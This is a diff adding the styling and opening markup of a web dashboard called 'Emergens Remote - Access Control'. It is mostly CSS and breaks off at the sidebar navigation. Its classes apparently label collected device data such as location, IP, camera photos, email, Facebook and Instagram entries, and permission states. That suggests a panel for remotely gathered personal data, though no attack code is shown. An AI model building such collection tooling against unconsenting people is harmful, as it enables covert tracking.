@@ -1,0 +1,1833 @@
+<!DOCTYPE html>
+<html lang="ms" data-theme="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Emergens Remote - Access Control</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        @font-face {
+            font-family: 'Space Grotesk';
+            src: url('https://fonts.gstatic.com/s/spacegrotesk/v22/V8mDoQDjQSkFtoMM3T6r8E7mPbF4Cw.woff2') format('woff2');
+            font-weight: 400;
+            font-style: normal;
+            font-display: swap;
+        }
+        @font-face {
+            font-family: 'Road Rage';
+            src: url('https://fonts.cdnfonts.com/s/14068/Road_Rage.woff') format('woff');
+            font-weight: normal;
+            font-style: normal;
+            font-display: swap;
+        }
+        :root {
+            --font-sans: 'Inter', sans-serif;
+            --font-mono: 'JetBrains Mono', monospace;
+            --font-display: 'Space Grotesk', sans-serif;
+            --font-rage: 'Road Rage', 'Space Grotesk', sans-serif;
+            --radius-xs: 6px;
+            --radius-sm: 10px;
+            --radius-md: 14px;
+            --radius-lg: 20px;
+            --radius-xl: 28px;
+            --radius-full: 9999px;
+            --transition-fast: 150ms ease;
+            --transition-med: 350ms cubic-bezier(0.4, 0, 0.2, 1);
+            --transition-slow: 600ms cubic-bezier(0.16, 1, 0.3, 1);
+            --ease-out-expo: cubic-bezier(0.16, 1, 0.3, 1);
+            --blue-300: #93c5fd;
+            --blue-400: #60a5fa;
+            --blue-500: #3b82f6;
+            --blue-600: #2563eb;
+            --blue-700: #1d4ed8;
+            --blue-800: #1e40af;
+            --blue-glow: rgba(59, 130, 246, 0.4);
+            --blue-glow-soft: rgba(59, 130, 246, 0.18);
+            --cyan-400: #22d3ee;
+            --cyan-glow: rgba(6, 182, 212, 0.25);
+            --indigo-400: #818cf8;
+            --indigo-glow: rgba(99, 102, 241, 0.25);
+            --gold: #d4a574;
+            --gold-light: #e7cd9f;
+            --gold-dark: #b8945f;
+            --gold-glow: rgba(212, 165, 116, 0.25);
+            --gold-glow-soft: rgba(212, 165, 116, 0.1);
+            --green: #10b981;
+            --green-glow: rgba(16, 185, 129, 0.15);
+            --red: #ef4444;
+            --red-glow: rgba(239, 68, 68, 0.15);
+            --yellow: #f59e0b;
+            --yellow-glow: rgba(245, 158, 11, 0.2);
+        }
+        :root[data-theme="dark"] {
+            --bg-primary: #030712;
+            --bg-secondary: #0a0f1e;
+            --bg-tertiary: #111827;
+            --bg-card: rgba(26, 35, 50, 0.95);
+            --bg-card-hover: rgba(30, 42, 60, 0.98);
+            --bg-input: rgba(10, 15, 30, 0.85);
+            --border: #1e293b;
+            --border-subtle: #334155;
+            --border-strong: rgba(80, 130, 220, 0.45);
+            --border-accent: rgba(96, 165, 250, 0.55);
+            --text-primary: #f1f5f9;
+            --text-secondary: #cbd5e1;
+            --text-muted: #64748b;
+            --nav-bg: rgba(3, 7, 18, 0.95);
+            --shadow: 0 4px 35px rgba(0, 20, 60, 0.7);
+            --shadow-sm: 0 2px 12px rgba(0, 20, 60, 0.5);
+            --shadow-glow: 0 0 35px var(--blue-glow);
+            --scrollbar-track: #030712;
+            --scrollbar-thumb: #1e293b;
+            --card-bg: linear-gradient(160deg, rgba(26, 35, 50, 0.95), rgba(10, 15, 30, 0.98));
+            --panel-gradient: linear-gradient(155deg, #050a16 0%, #0b1120 15%, #172554 35%, #1e3a8a 55%, #1e40af 75%, #1d4ed8 90%, #2563eb 100%);
+            --panel-overlay: rgba(3, 7, 18, 0.62);
+        }
+        :root[data-theme="light"] {
+            --bg-primary: #e8ecf2;
+            --bg-secondary: #ffffff;
+            --bg-tertiary: #e4e9f0;
+            --bg-card: rgba(255, 255, 255, 0.95);
+            --bg-card-hover: rgba(245, 248, 255, 0.98);
+            --bg-input: rgba(255, 255, 255, 0.9);
+            --border: #c5d0de;
+            --border-subtle: #d5dde8;
+            --border-strong: rgba(80, 110, 160, 0.5);
+            --border-accent: rgba(59, 130, 246, 0.5);
+            --text-primary: #0f172a;
+            --text-secondary: #334155;
+            --text-muted: #64748b;
+            --nav-bg: rgba(255, 255, 255, 0.95);
+            --shadow: 0 4px 30px rgba(15, 23, 42, 0.15);
+            --shadow-sm: 0 2px 10px rgba(15, 23, 42, 0.08);
+            --shadow-glow: 0 0 30px rgba(59, 130, 246, 0.2);
+            --scrollbar-track: #e8edf5;
+            --scrollbar-thumb: #b0c0d8;
+            --card-bg: linear-gradient(160deg, #ffffff, #f5f7fa);
+            --panel-gradient: linear-gradient(155deg, #b0c8e8 0%, #9ab8e0 15%, #7ba5d5 35%, #5d8fd0 55%, #4a84d8 75%, #3570cd 90%, #2563c0 100%);
+            --panel-overlay: rgba(30, 58, 95, 0.35);
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html, body {
+            font-family: var(--font-sans);
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            min-height: 100vh;
+            font-size: 14px;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+            overflow-x: hidden;
+            transition: background 0.4s ease, color 0.4s ease;
+            line-height: 1.5;
+        }
+        ::-webkit-scrollbar { width: 5px; height: 5px; }
+        ::-webkit-scrollbar-track { background: var(--scrollbar-track); }
+        ::-webkit-scrollbar-thumb { background: var(--scrollbar-thumb); border-radius: 4px; }
+        ::-webkit-scrollbar-thumb:hover { background: var(--blue-400); }
+        a { color: var(--blue-400); text-decoration: none; }
+        button { cursor: pointer; font-family: var(--font-sans); }
+        input, select, textarea { font-family: var(--font-sans); }
+        h1, h2, h3, h4, h5, h6 { font-family: var(--font-display); letter-spacing: -0.02em; }
+        button:focus-visible, input:focus-visible, a:focus-visible { outline: 2px solid var(--blue-500); outline-offset: 3px; }
+        [hidden] { display: none !important; }
+
+        .bg-orb {
+            position: fixed;
+            border-radius: 50%;
+            filter: blur(140px);
+            pointer-events: none;
+            z-index: 0;
+            opacity: 0.04;
+        }
+        .bg-orb-1 { width: 700px; height: 700px; background: var(--blue-600); top: -200px; right: -200px; animation: orbDrift1 18s ease-in-out infinite; }
+        .bg-orb-2 { width: 500px; height: 500px; background: var(--blue-700); bottom: -150px; left: -100px; animation: orbDrift2 22s ease-in-out infinite; }
+        .bg-orb-3 { width: 350px; height: 350px; background: var(--gold); top: 45%; left: 55%; opacity: 0.02; animation: orbDrift3 16s ease-in-out infinite; }
+        [data-theme="light"] .bg-orb { opacity: 0.03; }
+        @keyframes orbDrift1 { 0%, 100% { transform: translate(0, 0) scale(1); } 33% { transform: translate(-40px, 30px) scale(1.1); } 66% { transform: translate(30px, -20px) scale(0.95); } }
+        @keyframes orbDrift2 { 0%, 100% { transform: translate(0, 0) scale(1); } 33% { transform: translate(35px, -25px) scale(1.05); } 66% { transform: translate(-25px, 35px) scale(1.15); } }
+        @keyframes orbDrift3 { 0%, 100% { transform: translate(-50%, -50%) scale(1); } 50% { transform: translate(-45%, -55%) scale(1.2); } }
+
+        .grid-overlay {
+            position: fixed;
+            inset: 0;
+            z-index: 0;
+            pointer-events: none;
+            background-image: linear-gradient(rgba(59, 130, 246, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(59, 130, 246, 0.03) 1px, transparent 1px);
+            background-size: 60px 60px;
+            mask-image: radial-gradient(ellipse at center, black 30%, transparent 70%);
+            -webkit-mask-image: radial-gradient(ellipse at center, black 30%, transparent 70%);
+        }
+
+        .outer-bubbles {
+            position: fixed;
+            inset: 0;
+            z-index: 0;
+            pointer-events: none;
+            overflow: hidden;
+        }
+        .outer-bubble {
+            position: absolute;
+            bottom: -80px;
+            border-radius: 50%;
+            background: rgba(59, 130, 246, 0.15);
+            border: 1.5px solid rgba(59, 130, 246, 0.3);
+            backdrop-filter: blur(2px);
+            -webkit-backdrop-filter: blur(2px);
+            animation: outerBubbleRise 12s ease-in-out infinite;
+            opacity: 0;
+        }
+        .outer-bubble:nth-child(1) { width: 40px; height: 40px; left: 5%; animation-duration: 13s; animation-delay: 0s; }
+        .outer-bubble:nth-child(2) { width: 25px; height: 25px; left: 12%; animation-duration: 10s; animation-delay: 2s; }
+        .outer-bubble:nth-child(3) { width: 55px; height: 55px; left: 22%; animation-duration: 15s; animation-delay: 4s; }
+        .outer-bubble:nth-child(4) { width: 18px; height: 18px; left: 30%; animation-duration: 9s; animation-delay: 1s; }
+        .outer-bubble:nth-child(5) { width: 35px; height: 35px; left: 38%; animation-duration: 11s; animation-delay: 6s; }
+        .outer-bubble:nth-child(6) { width: 28px; height: 28px; left: 48%; animation-duration: 12.5s; animation-delay: 3s; }
+        .outer-bubble:nth-child(7) { width: 60px; height: 60px; left: 62%; animation-duration: 14s; animation-delay: 5s; }
+        .outer-bubble:nth-child(8) { width: 20px; height: 20px; left: 70%; animation-duration: 9.5s; animation-delay: 0.5s; }
+        .outer-bubble:nth-child(9) { width: 45px; height: 45px; left: 78%; animation-duration: 12s; animation-delay: 7s; }
+        .outer-bubble:nth-child(10) { width: 22px; height: 22px; left: 85%; animation-duration: 10.5s; animation-delay: 2.5s; }
+        .outer-bubble:nth-child(11) { width: 50px; height: 50px; left: 92%; animation-duration: 13.5s; animation-delay: 8s; }
+        .outer-bubble:nth-child(12) { width: 30px; height: 30px; left: 45%; animation-duration: 11.5s; animation-delay: 3.5s; }
+        @keyframes outerBubbleRise {
+            0% { opacity: 0; transform: translateY(0) translateX(0) scale(0.5); }
+            10% { opacity: 1; transform: translateY(-80px) translateX(10px) scale(0.9); }
+            35% { transform: translateY(-180px) translateX(-12px) scale(1); opacity: 0.8; }
+            60% { transform: translateY(-300px) translateX(8px) scale(1.05); opacity: 0.5; }
+            85% { transform: translateY(-420px) translateX(-6px) scale(0.95); opacity: 0.2; }
+            100% { transform: translateY(-550px) translateX(0) scale(0.8); opacity: 0; }
+        }
+
+        .app-wrapper {
+            display: flex;
+            min-height: 100vh;
+            opacity: 0;
+            animation: appFadeIn 0.6s var(--ease-out-expo) forwards;
+            position: relative;
+            z-index: 1;
+        }
+        @keyframes appFadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
+
+        .sidebar {
+            width: 245px;
+            min-width: 245px;
+            background: var(--bg-secondary);
+            border-right: 1px solid var(--border);
+            display: flex;
+            flex-direction: column;
+            position: fixed;
+            top: 0;
+            left: 0;
+            bottom: 0;
+            z-index: 100;
+            transition: transform 0.35s var(--ease-out-expo), background 0.4s ease;
+        }
+        .sidebar-brand {
+            padding: 20px 16px;
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            position: relative;
+            overflow: hidden;
+        }
+        .sidebar-brand::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, var(--blue-400), var(--cyan-400), var(--blue-400), transparent);
+            background-size: 200% 100%;
+            animation: shimmerLine 3s linear infinite;
+        }
+        @keyframes shimmerLine { 0% { background-position: 0% 0; } 100% { background-position: 200% 0; } }
+        .brand-icon {
+            width: 42px;
+            height: 42px;
+            background: linear-gradient(135deg, var(--blue-500), var(--blue-800));
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 0 25px var(--blue-glow);
+            flex-shrink: 0;
+            animation: iconPulse 3s ease-in-out infinite;
+        }
+        @keyframes iconPulse { 0%, 100% { box-shadow: 0 0 25px var(--blue-glow); } 50% { box-shadow: 0 0 45px var(--blue-glow); } }
+        .brand-icon i { font-size: 18px; color: #fff; }
+        .brand-name {
+            font-family: var(--font-display);
+            font-size: 16px;
+            font-weight: 700;
+            letter-spacing: -0.3px;
+            line-height: 1.1;
+            color: var(--text-primary);
+        }
+        .brand-name span {
+            background: linear-gradient(135deg, var(--blue-300), var(--cyan-400));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        .brand-sub {
+            font-size: 8px;
+            color: var(--text-muted);
+            letter-spacing: 2.5px;
+            text-transform: uppercase;
+            font-weight: 500;
+        }
+        .sidebar-nav { flex: 1; padding: 14px 10px; overflow-y: auto; }
+        .nav-section-label {
+            font-size: 8px;
+            font-weight: 700;
+            color: var(--text-muted);
+            letter-spacing: 2.5px;
+            text-transform: uppercase;
+            padding: 0 10px;
+            margin-bottom: 6px;
+            margin-top: 16px;
+        }
+        .nav-section-label:first-child { margin-top: 0; }
+        .nav-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 10px 12px;
+            border-radius: 9px;
+            color: var(--text-secondary);
+            cursor: pointer;
+            transition: all 0.25s var(--ease-out-expo);
+            margin-bottom: 2px;
+            position: relative;
+            font-size: 12px;
+            font-weight: 500;
+        }
+        .nav-item i { width: 16px; text-align: center; font-size: 13px; flex-shrink: 0; }
+        .nav-item:hover { background: var(--bg-card-hover); color: var(--text-primary); transform: translateX(3px); }
+        .nav-item.active { background: var(--blue-glow-soft); color: var(--blue-300); font-weight: 600; }
+        .nav-item.active::before {
+            content: '';
+            position: absolute;
+            left: 0;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 3px;
+            height: 55%;
+            background: var(--blue-400);
+            border-radius: 0 3px 3px 0;
+            box-shadow: 0 0 10px var(--blue-glow);
+        }
+        .nav-badge {
+            margin-left: auto;
+            background: var(--blue-glow-soft);
+            color: var(--blue-300);
+            font-size: 8px;
+            padding: 2px 7px;
+            border-radius: 10px;
+            font-weight: 700;
+        }
+        .sidebar-footer { padding: 14px 10px; border-top: 1px solid var(--border); }
+        .user-chip {
+            display: flex;
+            align-items: center;
+            gap: 9px;
+            padding: 9px 11px;
+            background: var(--bg-card);
+            border-radius: 9px;
+            border: 1px solid var(--border);
+        }
+        .user-avatar {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, var(--blue-400), var(--blue-700));
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            font-weight: 700;
+            font-size: 12px;
+            flex-shrink: 0;
+        }
+        .user-name { font-size: 11px; font-weight: 600; color: var(--text-primary); }
+        .user-role { font-size: 8px; color: var(--blue-300); letter-spacing: 1.5px; text-transform: uppercase; font-weight: 700; }
+
+        .main-area { flex: 1; margin-left: 245px; min-height: 100vh; }
+        .top-bar {
+            background: var(--nav-bg);
+            border-bottom: 1px solid var(--border);
+            padding: 0 22px;
+            height: 58px;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            position: sticky;
+            top: 0;
+            z-index: 90;
+            backdrop-filter: blur(14px);
+            -webkit-backdrop-filter: blur(14px);
+            transition: background 0.4s ease;
+        }
+        .menu-toggle { display: none; background: none; border: none; color: var(--text-secondary); font-size: 18px; }
+        .page-title { font-family: var(--font-display); font-size: 16px; font-weight: 700; }
+        .page-subtitle { font-size: 10px; color: var(--text-muted); }
+        .top-bar-right { margin-left: auto; display: flex; gap: 8px; align-items: center; }
+        .top-btn {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            color: var(--text-secondary);
+            width: 34px;
+            height: 34px;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 13px;
+            cursor: pointer;
+            transition: all 0.25s;
+            position: relative;
+        }
+        .top-btn:hover { border-color: var(--blue-400); color: var(--blue-300); }
+        .top-btn.active { border-color: var(--green); color: var(--green); background: var(--green-glow); }
+        .connection-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: var(--green);
+            box-shadow: 0 0 10px var(--green);
+            animation: pulseDot 2s infinite;
+        }
+        @keyframes pulseDot { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
+        .connection-dot.offline { background: var(--red); box-shadow: 0 0 10px var(--red); animation: none; }
+
+        .content-area { padding: 22px; max-width: 1300px; width: 100%; margin: 0 auto; }
+        .card {
+            background: var(--card-bg);
+            border: 1px solid var(--border-subtle);
+            border-radius: var(--radius-md);
+            padding: 18px;
+            box-shadow: var(--shadow-sm);
+            margin-bottom: 18px;
+            transition: background 0.4s ease, border 0.4s ease;
+            position: relative;
+        }
+        .card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, var(--blue-500), var(--gold), var(--blue-500));
+            border-radius: var(--radius-md) var(--radius-md) 0 0;
+            opacity: 0.6;
+        }
+        .card-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 14px; flex-wrap: wrap; gap: 8px; }
+        .card-title { font-family: var(--font-display); font-size: 13px; font-weight: 700; }
+        .section-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 16px;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+        .section-title { font-family: var(--font-display); font-size: 15px; font-weight: 700; }
+        .section-desc { font-size: 10px; color: var(--text-muted); margin-top: 3px; }
+        .refresh-btn {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            color: var(--text-secondary);
+            padding: 8px 14px;
+            border-radius: 8px;
+            font-size: 10px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            transition: all 0.25s;
+            font-family: var(--font-sans);
+        }
+        .refresh-btn:hover { border-color: var(--blue-400); color: var(--blue-300); }
+        .refresh-btn.active { border-color: var(--green); color: var(--green); }
+        .refresh-btn.active:hover { border-color: var(--green); color: var(--green); }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+            gap: 12px;
+            margin-bottom: 18px;
+        }
+        .stat-card {
+            background: var(--card-bg);
+            border: 1px solid var(--border-subtle);
+            border-radius: var(--radius-sm);
+            padding: 16px;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        .stat-card::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -60%;
+            width: 50%;
+            height: 200%;
+            background: linear-gradient(105deg, transparent 0%, rgba(255, 255, 255, 0.06) 45%, rgba(255, 255, 255, 0.1) 50%, rgba(255, 255, 255, 0.06) 55%, transparent 100%);
+            transform: rotate(20deg);
+            animation: sheenSweep 7s ease-in-out infinite;
+            pointer-events: none;
+        }
+        @keyframes sheenSweep { 0% { left: -60%; opacity: 0; } 15% { opacity: 1; } 40% { left: 120%; opacity: 0; } 100% { left: 120%; opacity: 0; } }
+        .stat-card:hover {
+            border-color: var(--border-accent);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px var(--blue-glow-soft);
+        }
+        .stat-card-icon {
+            width: 36px;
+            height: 36px;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 10px;
+            font-size: 15px;
+        }
+        .stat-card-value {
+            font-size: 24px;
+            font-weight: 800;
+            font-family: var(--font-mono);
+            color: var(--text-primary);
+            line-height: 1;
+        }
+        .stat-card-label { font-size: 10px; color: var(--text-muted); margin-top: 6px; font-weight: 500; }
+
+        .results-table { width: 100%; border-collapse: collapse; }
+        .results-table th {
+            font-size: 9px;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            color: var(--text-muted);
+            text-align: left;
+            padding: 10px 12px;
+            border-bottom: 1px solid var(--border);
+            font-weight: 700;
+            white-space: nowrap;
+        }
+        .results-table td {
+            font-size: 11px;
+            padding: 12px;
+            border-bottom: 1px solid var(--border);
+            color: var(--text-secondary);
+            vertical-align: top;
+        }
+        .results-table tr:hover td { background: var(--bg-card-hover); }
+        .type-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+            padding: 3px 10px;
+            border-radius: 14px;
+            font-size: 8px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            font-family: var(--font-mono);
+        }
+        .badge-location { background: var(--blue-glow-soft); color: var(--blue-300); border: 1px solid var(--border-accent); }
+        .badge-ip { background: var(--cyan-glow); color: var(--cyan-400); border: 1px solid rgba(6, 182, 212, 0.3); }
+        .badge-photo { background: var(--indigo-glow); color: var(--indigo-400); border: 1px solid rgba(99, 102, 241, 0.3); }
+        .badge-email { background: var(--green-glow); color: var(--green); border: 1px solid rgba(16, 185, 129, 0.3); }
+        .badge-facebook { background: var(--blue-glow-soft); color: var(--blue-400); border: 1px solid var(--border-accent); }
+        .badge-instagram { background: var(--cyan-glow); color: var(--cyan-400); border: 1px solid rgba(6, 182, 212, 0.3); }
+        .badge-auto { background: var(--indigo-glow); color: var(--indigo-400); border: 1px solid rgba(99, 102, 241, 0.3); }
+        .badge-camera { background: var(--yellow-glow); color: var(--yellow); border: 1px solid rgba(245, 158, 11, 0.3); }
+        .badge-battery { background: var(--green-glow); color: var(--green); border: 1px solid rgba(16, 185, 129, 0.3); }
+        .badge-network { background: var(--red-glow); color: var(--red); border: 1px solid rgba(239, 68, 68, 0.3); }
+
+        .lat-lng-box {
+            font-family: var(--font-mono);
+            font-size: 10px;
+            color: var(--cyan-400);
+            background: var(--bg-input);
+            padding: 4px 8px;
+            border-radius: 4px;
+            display: inline-block;
+            margin-top: 4px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .lat-lng-box:hover { border-color: var(--cyan-400); box-shadow: 0 0 10px var(--cyan-glow); }
+
+        .data-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+            gap: 10px;
+            margin-top: 8px;
+        }
+        .data-item {
+            background: var(--bg-input);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 10px 12px;
+        }
+        .data-item-label {
+            font-size: 8px;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            color: var(--text-muted);
+            font-weight: 700;
+            margin-bottom: 4px;
+        }
+        .data-item-value {
+            font-size: 11px;
+            font-family: var(--font-mono);
+            color: var(--text-primary);
+            word-break: break-all;
+        }
+
+        .empty-state { text-align: center; padding: 32px 16px; color: var(--text-muted); }
+        .empty-state i { font-size: 38px; margin-bottom: 10px; display: block; opacity: 0.4; }
+        .empty-state p { font-size: 12px; }
+
+        .result-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border-subtle);
+            border-radius: var(--radius-sm);
+            padding: 14px;
+            margin-bottom: 12px;
+            transition: all 0.25s ease;
+        }
+        .result-card:hover {
+            border-color: var(--border-accent);
+            box-shadow: 0 0 20px var(--blue-glow-soft);
+        }
+        .result-card-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin-bottom: 10px;
+        }
+        .result-card-title {
+            font-weight: 700;
+            font-size: 13px;
+            color: var(--text-primary);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+        .result-card-time { font-size: 9px; color: var(--text-muted); font-family: var(--font-mono); }
+        .expand-btn {
+            background: none;
+            border: 1px solid var(--border);
+            color: var(--text-secondary);
+            padding: 5px 10px;
+            border-radius: 6px;
+            font-size: 9px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .expand-btn:hover { border-color: var(--blue-400); color: var(--blue-300); }
+        .delete-btn {
+            background: var(--red-glow);
+            border: 1px solid var(--red);
+            color: var(--red);
+            padding: 5px 10px;
+            border-radius: 6px;
+            font-size: 9px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .delete-btn:hover { background: var(--red); color: #fff; box-shadow: 0 0 12px var(--red-glow); }
+        .result-meta-row {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+            font-size: 10px;
+            color: var(--text-muted);
+        }
+        .result-meta-row span { display: inline-flex; align-items: center; gap: 4px; }
+        .permission-indicator {
+            display: inline-flex;
+            align-items: center;
+            gap: 3px;
+            font-size: 9px;
+            font-weight: 600;
+            padding: 2px 8px;
+            border-radius: 10px;
+        }
+        .permission-granted { color: var(--green); background: var(--green-glow); }
+        .permission-denied { color: var(--red); background: var(--red-glow); }
+
+        .filter-bar { display: flex; gap: 10px; flex-wrap: wrap; align-items: center; margin-bottom: 14px; }
+        .filter-input {
+            background: var(--bg-input);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 8px 12px;
+            color: var(--text-primary);
+            font-size: 11px;
+            outline: none;
+            min-width: 150px;
+            transition: all 0.25s;
+        }
+        .filter-input:focus { border-color: var(--blue-400); box-shadow: 0 0 12px var(--blue-glow-soft); }
+        .filter-select {
+            background: var(--bg-input);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 8px 12px;
+            color: var(--text-primary);
+            font-size: 11px;
+            outline: none;
+            cursor: pointer;
+            transition: all 0.25s;
+        }
+        .filter-select:focus { border-color: var(--blue-400); }
+        .filter-btn {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            color: var(--text-secondary);
+            padding: 8px 14px;
+            border-radius: 8px;
+            font-size: 10px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            transition: all 0.25s;
+        }
+        .filter-btn:hover { border-color: var(--blue-400); color: var(--blue-300); }
+        .filter-btn.active { border-color: var(--blue-400); color: var(--blue-300); background: var(--blue-glow-soft); }
+
+        .toast-container { position: fixed; bottom: 20px; right: 20px; z-index: 9999; display: flex; flex-direction: column; gap: 8px; }
+        .toast {
+            background: var(--bg-card);
+            border: 1px solid var(--border-accent);
+            border-radius: var(--radius-sm);
+            padding: 12px 16px;
+            color: var(--text-primary);
+            font-size: 11px;
+            font-weight: 500;
+            box-shadow: var(--shadow);
+            animation: slideInRight 0.35s var(--ease-out-expo);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            max-width: 350px;
+        }
+        .toast.success { border-color: var(--green); }
+        .toast.error { border-color: var(--red); }
+        .toast.info { border-color: var(--blue-400); }
+        .toast.hidden { display: none; }
+        @keyframes slideInRight { from { opacity: 0; transform: translateX(100%); } to { opacity: 1; transform: translateX(0); } }
+        .toast.hide { animation: slideOutRight 0.3s var(--ease-out-expo) forwards; }
+        @keyframes slideOutRight { from { opacity: 1; transform: translateX(0); } to { opacity: 0; transform: translateX(100%); } }
+
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 9998;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: fadeIn 0.25s ease;
+        }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        .modal-content {
+            background: var(--bg-card);
+            border: 1px solid var(--border-accent);
+            border-radius: var(--radius-lg);
+            padding: 20px;
+            max-width: 600px;
+            width: 90%;
+            max-height: 80vh;
+            overflow-y: auto;
+            box-shadow: var(--shadow);
+        }
+        .modal-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 16px; }
+        .modal-title { font-family: var(--font-display); font-size: 15px; font-weight: 700; }
+        .modal-close { background: none; border: none; color: var(--text-muted); font-size: 18px; cursor: pointer; }
+        .modal-close:hover { color: var(--red); }
+        .photo-display { max-width: 100%; max-height: 300px; border-radius: 8px; margin-top: 8px; border: 1px solid var(--border); }
+
+        .btn-submit {
+            width: 100%;
+            padding: 11px;
+            background: linear-gradient(135deg, var(--blue-500), var(--blue-800));
+            border: none;
+            border-radius: 8px;
+            color: #fff;
+            font-weight: 700;
+            font-size: 12px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 3px 14px var(--blue-glow);
+            font-family: var(--font-sans);
+        }
+        .btn-submit:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 28px var(--blue-glow);
+        }
+        .btn-submit:active { transform: translateY(0) scale(0.98); }
+
+        .input-field {
+            width: 100%;
+            padding: 10px 12px;
+            background: var(--bg-input);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            color: var(--text-primary);
+            font-size: 12px;
+            margin-top: 4px;
+            outline: none;
+            transition: all 0.25s;
+        }
+        .input-field:focus {
+            border-color: var(--blue-400);
+            box-shadow: 0 0 12px var(--blue-glow-soft);
+        }
+
+        @media (max-width: 768px) {
+            .sidebar { transform: translateX(-100%); }
+            .sidebar.open { transform: translateX(0); }
+            .main-area { margin-left: 0; }
+            .menu-toggle { display: flex; }
+            .content-area { padding: 14px; }
+            .results-table { display: block; overflow-x: auto; }
+            .data-grid { grid-template-columns: 1fr; }
+            .stats-grid { grid-template-columns: repeat(2, 1fr); }
+            .outer-bubble:nth-child(n+7) { display: none; }
+        }
+        @media (max-width: 480px) {
+            .stats-grid { grid-template-columns: 1fr; }
+            .toast-container { bottom: 16px; right: 16px; left: 16px; }
+            .toast { max-width: none; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="outer-bubbles">
+        <div class="outer-bubble"></div><div class="outer-bubble"></div><div class="outer-bubble"></div>
+        <div class="outer-bubble"></div><div class="outer-bubble"></div><div class="outer-bubble"></div>
+        <div class="outer-bubble"></div><div class="outer-bubble"></div><div class="outer-bubble"></div>
+        <div class="outer-bubble"></div><div class="outer-bubble"></div><div class="outer-bubble"></div>
+    </div>
+    <div class="bg-orb bg-orb-1"></div>
+    <div class="bg-orb bg-orb-2"></div>
+    <div class="bg-orb bg-orb-3"></div>
+    <div class="grid-overlay"></div>
+
+    <div class="app-wrapper">
+        <aside class="sidebar" id="sidebar">
+            <div class="sidebar-brand">
+                <div class="brand-icon"><i class="fa-solid fa-shield-halved"></i></div>
+                <div>
+                    <div class="brand-name">Emergens <span>Remote</span></div>
+                    <div class="brand-sub">Access Control</div>
+                </div>
+            </div>
+            <nav class="sidebar-nav">
+                <div class="nav-section-label">Navigasi</div>
+                <div class="nav-item" data-section="overview" onclick="switchSection('overview')">
